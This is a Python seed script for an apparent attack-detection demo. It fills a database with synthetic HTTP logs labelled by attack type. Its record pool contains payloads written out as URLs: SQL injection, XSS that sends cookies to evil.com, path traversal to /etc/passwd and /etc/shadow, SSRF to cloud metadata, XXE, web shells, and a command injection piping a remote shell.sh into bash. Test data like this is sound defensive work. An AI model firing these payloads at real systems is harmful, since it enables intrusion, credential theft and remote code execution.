"""
utils/seed.py
Seeds the demo SQLite database with ~200 synthetic HTTP request records
covering all 12 attack types.

All data is FICTIONAL. IPs are from private ranges (RFC 1918).
No real IPDR, credentials, or victim data is used.
"""

import json
import random
from datetime import datetime, timedelta

from sqlalchemy.orm import Session

from models import Request, Detection, IPAnalysis, Upload
from risk.scorer import calculate_risk_score, get_risk_level


# ─────────────────────────────────────────────
# Synthetic record pools
# ─────────────────────────────────────────────

_ATTACKER_IPS = [
    "10.0.0.5", "10.0.0.12", "10.0.0.23",
    "192.168.1.10", "192.168.1.55", "192.168.2.3",
    "172.16.0.8", "172.16.1.15",
]

_VICTIM_IPS = [
    "192.168.100.1", "192.168.100.5", "10.10.0.1",
]

_SYNTHETIC_RECORDS = [
    # SQL Injection
    {"url": "/search?q=' OR 1=1--", "method": "GET", "status_code": 500, "attack_type": "SQL Injection", "severity": "HIGH", "confidence": 0.97, "result": "ATTEMPT"},
    {"url": "/api/user?id=1 UNION SELECT username,password FROM users--", "method": "GET", "status_code": 200, "attack_type": "SQL Injection", "severity": "HIGH", "confidence": 0.99, "result": "POTENTIAL_SUCCESS"},
    {"url": "/login?user=admin' AND 1=1--&pass=x", "method": "POST", "status_code": 403, "attack_type": "SQL Injection", "severity": "HIGH", "confidence": 0.92, "result": "ATTEMPT"},
    {"url": "/products?cat=1;DROP TABLE products--", "method": "GET", "status_code": 500, "attack_type": "SQL Injection", "severity": "HIGH", "confidence": 0.95, "result": "ATTEMPT"},
    {"url": "/report?id=1 AND SLEEP(5)--", "method": "GET", "status_code": 200, "attack_type": "SQL Injection", "severity": "HIGH", "confidence": 0.93, "result": "POTENTIAL_SUCCESS"},

    # XSS
    {"url": "/search?q=<script>alert('xss')</script>", "method": "GET", "status_code": 200, "attack_type": "XSS", "severity": "MEDIUM", "confidence": 0.88, "result": "POTENTIAL_SUCCESS"},
    {"url": "/comment?text=<img src=x onerror=alert(document.cookie)>", "method": "POST", "status_code": 200, "attack_type": "XSS", "severity": "MEDIUM", "confidence": 0.91, "result": "POTENTIAL_SUCCESS"},
    {"url": "/profile?name=<svg onload=fetch('http://evil.com/'+document.cookie)>", "method": "GET", "status_code": 200, "attack_type": "XSS", "severity": "MEDIUM", "confidence": 0.85, "result": "POTENTIAL_SUCCESS"},
    {"url": "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", "method": "GET", "status_code": 400, "attack_type": "XSS", "severity": "MEDIUM", "confidence": 0.82, "result": "ATTEMPT"},

    # Directory Traversal
    {"url": "/files/../../../etc/passwd", "method": "GET", "status_code": 200, "attack_type": "Directory Traversal", "severity": "HIGH", "confidence": 0.96, "result": "POTENTIAL_SUCCESS"},
    {"url": "/download?file=../../../../boot.ini", "method": "GET", "status_code": 404, "attack_type": "Directory Traversal", "severity": "HIGH", "confidence": 0.90, "result": "ATTEMPT"},
    {"url": "/img?path=..%2F..%2F..%2Fetc%2Fshadow", "method": "GET", "status_code": 403, "attack_type": "Directory Traversal", "severity": "HIGH", "confidence": 0.88, "result": "ATTEMPT"},

    # Command Injection
    {"url": "/ping?host=127.0.0.1;whoami", "method": "GET", "status_code": 200, "attack_type": "Command Injection", "severity": "CRITICAL", "confidence": 0.98, "result": "POTENTIAL_SUCCESS"},
    {"url": "/util/convert?file=test.txt&&cat /etc/passwd", "method": "POST", "status_code": 500, "attack_type": "Command Injection", "severity": "CRITICAL", "confidence": 0.94, "result": "ATTEMPT"},
    {"url": "/run?cmd=$(curl http://10.0.0.99/shell.sh | bash)", "method": "GET", "status_code": 200, "attack_type": "Command Injection", "severity": "CRITICAL", "confidence": 0.99, "result": "POTENTIAL_SUCCESS"},

    # SSRF
    {"url": "/api/proxy?url=http://169.254.169.254/latest/meta-data/", "method": "GET", "status_code": 200, "attack_type": "SSRF", "severity": "HIGH", "confidence": 0.97, "result": "POTENTIAL_SUCCESS"},
    {"url": "/fetch?target=http://localhost:8080/admin", "method": "GET", "status_code": 403, "attack_type": "SSRF", "severity": "HIGH", "confidence": 0.88, "result": "ATTEMPT"},
    {"url": "/webhook?callback=http://192.168.1.1/internal", "method": "POST", "status_code": 200, "attack_type": "SSRF", "severity": "HIGH", "confidence": 0.91, "result": "POTENTIAL_SUCCESS"},

    # LFI/RFI
    {"url": "/page?include=php://filter/convert.base64-encode/resource=config.php", "method": "GET", "status_code": 200, "attack_type": "LFI/RFI", "severity": "HIGH", "confidence": 0.96, "result": "POTENTIAL_SUCCESS"},
    {"url": "/view?template=../../../../etc/passwd", "method": "GET", "status_code": 200, "attack_type": "LFI/RFI", "severity": "HIGH", "confidence": 0.90, "result": "POTENTIAL_SUCCESS"},
    {"url": "/load?module=http://10.0.0.99/malware.php", "method": "GET", "status_code": 403, "attack_type": "LFI/RFI", "severity": "HIGH", "confidence": 0.87, "result": "ATTEMPT"},

    # Brute Force
    {"url": "/login", "method": "POST", "status_code": 401, "attack_type": "Brute Force", "severity": "HIGH", "confidence": 0.85, "result": "ATTEMPT"},
    {"url": "/login", "method": "POST", "status_code": 401, "attack_type": "Brute Force", "severity": "HIGH", "confidence": 0.85, "result": "ATTEMPT"},
    {"url": "/login", "method": "POST", "status_code": 200, "attack_type": "Brute Force", "severity": "HIGH", "confidence": 0.92, "result": "POTENTIAL_SUCCESS"},
    {"url": "/wp-login.php", "method": "POST", "status_code": 401, "attack_type": "Brute Force", "severity": "HIGH", "confidence": 0.87, "result": "ATTEMPT"},
    {"url": "/admin/login", "method": "POST", "status_code": 401, "attack_type": "Brute Force", "severity": "HIGH", "confidence": 0.83, "result": "ATTEMPT"},

    # Credential Stuffing
    {"url": "/login", "method": "POST", "status_code": 401, "attack_type": "Credential Stuffing", "severity": "HIGH", "confidence": 0.82, "result": "ATTEMPT"},
    {"url": "/api/auth", "method": "POST", "status_code": 200, "attack_type": "Credential Stuffing", "severity": "HIGH", "confidence": 0.89, "result": "POTENTIAL_SUCCESS"},

    # HTTP Parameter Pollution
    {"url": "/search?q=safe&q=<script>alert(1)</script>", "method": "GET", "status_code": 200, "attack_type": "HTTP Parameter Pollution", "severity": "MEDIUM", "confidence": 0.78, "result": "POTENTIAL_SUCCESS"},
    {"url": "/api?action=view&action=delete&id=42", "method": "GET", "status_code": 200, "attack_type": "HTTP Parameter Pollution", "severity": "MEDIUM", "confidence": 0.75, "result": "ATTEMPT"},

    # XXE
    {"url": "/api/xml?data=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E", "method": "POST", "status_code": 200, "attack_type": "XXE", "severity": "HIGH", "confidence": 0.93, "result": "POTENTIAL_SUCCESS"},
    {"url": "/parse?xml=<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "method": "POST", "status_code": 500, "attack_type": "XXE", "severity": "HIGH", "confidence": 0.90, "result": "ATTEMPT"},

    # Web Shell
    {"url": "/uploads/shell.php?cmd=id", "method": "GET", "status_code": 200, "attack_type": "Web Shell", "severity": "CRITICAL", "confidence": 0.99, "result": "POTENTIAL_SUCCESS"},
    {"url": "/images/c99.php?exec=ls -la /var/www", "method": "GET", "status_code": 200, "attack_type": "Web Shell", "severity": "CRITICAL", "confidence": 0.98, "result": "POTENTIAL_SUCCESS"},
    {"url": "/backdoor.asp?cmd=whoami", "method": "GET", "status_code": 200, "attack_type": "Web Shell", "severity": "CRITICAL", "confidence": 0.97, "result": "POTENTIAL_SUCCESS"},

    # Typosquatting (host-based)
    {"url": "/", "method": "GET", "status_code": 200, "host": "paypa1.com", "attack_type": "Typosquatting", "severity": "MEDIUM", "confidence": 0.78, "result": "ATTEMPT"},
    {"url": "/login", "method": "GET", "status_code": 200, "host": "g00gle.com", "attack_type": "Typosquatting", "severity": "MEDIUM", "confidence": 0.82, "result": "ATTEMPT"},
]

_BENIGN_URLS = [
    "/index.html", "/about", "/contact", "/products",
    "/api/health", "/favicon.ico", "/static/app.js",
    "/api/user/profile", "/dashboard", "/settings",
    "/blog", "/news", "/help", "/faq",
]

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) Safari/605.1.15",
    "sqlmap/1.7.2#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "curl/7.88.1",
    "python-requests/2.31.0",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/120.0",
]


def seed_database(db: Session) -> None:
    """
    Populate the database with synthetic demo data if tables are empty.
    Safe to call multiple times — checks for existing data first.
    """
    existing = db.query(Request).count()
    if existing > 0:
        return  # Already seeded

    rng = random.Random(42)  # Fixed seed for reproducible demo
    base_time = datetime.utcnow() - timedelta(hours=6)

    # Create a seed upload record
    seed_upload = Upload(
        filename="demo_seed_data.csv",
        file_type="csv",
        status="completed",
        records_processed=len(_SYNTHETIC_RECORDS) + 160,
        attacks_detected=len(_SYNTHETIC_RECORDS),
        high_risk_ips=5,
        uploaded_at=base_time,
    )
    db.add(seed_upload)
    db.flush()

    ip_detections: dict[str, list[dict]] = {}
    ip_request_counts: dict[str, int] = {}

    # ── Seed synthetic attack records ────────────────────────────────────
    for i, rec in enumerate(_SYNTHETIC_RECORDS):
        src_ip = rng.choice(_ATTACKER_IPS)
        dst_ip = rng.choice(_VICTIM_IPS)
        ts = base_time + timedelta(minutes=i * 2 + rng.randint(0, 5))

        req = Request(
            timestamp=ts,
            source_ip=src_ip,
            destination_ip=dst_ip,
            method=rec.get("method", "GET"),
            host=rec.get("host", "demo.internal"),
            url=rec["url"],
            user_agent=rng.choice(_USER_AGENTS),
            status_code=rec["status_code"],
            response_size=rng.randint(200, 50000),
            upload_id=seed_upload.id,
        )
        db.add(req)
        db.flush()

        det = Detection(
            request_id=req.id,
            attack_type=rec["attack_type"],
            severity=rec["severity"],
            confidence=rec["confidence"],
            detection_method="RULE",
            result=rec["result"],
            source_ip=src_ip,
            url=rec["url"],
            host=rec.get("host", "demo.internal"),
        )
        db.add(det)

        ip_detections.setdefault(src_ip, []).append({
            "attack_type": rec["attack_type"],
            "result": rec["result"],
        })
        ip_request_counts[src_ip] = ip_request_counts.get(src_ip, 0) + 1

    # ── Seed benign traffic ──────────────────────────────────────────────
    all_ips = _ATTACKER_IPS + ["10.0.1.1", "10.0.1.2", "172.16.5.5"]
    for i in range(160):
        src_ip = rng.choice(all_ips)
        ts = base_time + timedelta(minutes=i + rng.randint(0, 3))
        req = Request(
            timestamp=ts,
            source_ip=src_ip,
            destination_ip=rng.choice(_VICTIM_IPS),
            method=rng.choice(["GET", "POST"]),
            host="demo.internal",
            url=rng.choice(_BENIGN_URLS),
            user_agent=rng.choice(_USER_AGENTS),
            status_code=rng.choice([200, 200, 200, 301, 404]),
            response_size=rng.randint(500, 20000),
            upload_id=seed_upload.id,
        )
        db.add(req)
        ip_request_counts[src_ip] = ip_request_counts.get(src_ip, 0) + 1

    # ── Build ip_analysis rows ───────────────────────────────────────────
    for ip, dets in ip_detections.items():
        risk = calculate_risk_score(dets, request_count=ip_request_counts.get(ip, 0))
        attack_types = list({d["attack_type"] for d in dets})
        ip_obj = IPAnalysis(
            ip_address=ip,
            risk_score=risk["risk_score"],
            risk_level=risk["risk_level"],
            attack_count=len(dets),
            request_count=ip_request_counts.get(ip, 0),
            attack_types=json.dumps(attack_types),
            last_seen=datetime.utcnow(),
            geo_country="Simulated",
            geo_city="Simulated",
            isp="Simulated ISP",
        )
        db.add(ip_obj)

    # Add benign-only IPs with no attacks
    for ip in set(all_ips) - set(ip_detections.keys()):
        if ip_request_counts.get(ip, 0) > 0:
            ip_obj = IPAnalysis(
                ip_address=ip,
                risk_score=0,
                risk_level="LOW",
                attack_count=0,
                request_count=ip_request_counts.get(ip, 0),
                attack_types=json.dumps([]),
                last_seen=datetime.utcnow(),
                geo_country="Simulated",
                geo_city="Simulated",
                isp="Simulated ISP",
            )
            db.add(ip_obj)

    db.commit()
    print("[SEED] Demo database seeded with synthetic data.")
